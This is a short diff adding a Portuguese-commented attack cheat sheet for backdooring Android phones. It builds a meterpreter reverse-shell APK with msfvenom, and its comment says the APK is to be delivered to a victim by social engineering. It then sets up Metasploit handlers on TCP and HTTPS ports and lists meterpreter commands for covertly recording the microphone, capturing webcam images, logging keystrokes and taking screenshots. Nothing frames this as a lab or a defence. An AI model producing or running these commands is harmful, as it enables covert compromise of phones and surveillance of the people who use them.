@@ -1,0 +1,48 @@
+/*Criar o Backdoor e usar Engengaria Social Para infectar a vitima*/
+msfvenom -p android/meterpreter/reverse_tcp  LHOST=IP_Kali LPORT=80 R > Backdoor_80.apk 
+
+/* TCP na Porta 4444 */
+msfconsole
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set LHOST 192.168.0.178
+set LPORT 4444
+exploit
+
+
+/* HTTPS na Porta 80 */
+use exploit/multi/handler
+set payload android/meterpreter/reverse_https
+set LHOST 192.168.0.178
+set LPORT 80
+exploit
+
+
+Stdapi: Webcam Commands
+=======================
+
+    Command        Description
+    -------        -----------
+    record_mic     Record audio from the default microphone for X seconds
+    webcam_chat    Start a video chat
+    webcam_list    List webcams
+    webcam_snap    Take a snapshot from the specified webcam
+    webcam_stream  Play a video stream from the specified webcam
+
+Stdapi: User interface Commands
+===============================
+
+    Command        Description
+    -------        -----------
+    enumdesktops   List all accessible desktops and window stations
+    getdesktop     Get the current meterpreter desktop
+    idletime       Returns the number of seconds the remote user has been idle
+    keyscan_dump   Dump the keystroke buffer
+    keyscan_start  Start capturing keystrokes
+    keyscan_stop   Stop capturing keystrokes
+    screenshot     Grab a screenshot of the interactive desktop
+    setdesktop     Change the meterpreters current desktop
+    uictl          Control some of the user interface components
+
+....
+
